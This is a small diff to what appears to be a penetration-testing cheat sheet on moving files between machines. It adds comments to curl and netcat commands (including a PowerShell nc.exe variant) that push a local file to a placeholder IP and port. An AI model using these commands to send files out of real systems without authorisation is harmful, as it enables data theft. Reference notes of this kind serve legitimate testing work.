@@ -8,11 +8,13 @@ python -m SimpleHTTPServer <PORT>
 ```
 ###### curl
 ```bash
-curl -F ‘data=@<FILE>' http://<IP>:<PORT>
+# Needs the receiver to be listening
+curl -F 'data=@<FILE>' http://<IP>:<PORT>
 ```
 
 ###### nc
 ```bash
+# Needs the receiver to be listening
 nc -w 3 <IP> <PORT> < <FILE>
 Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>
 ```
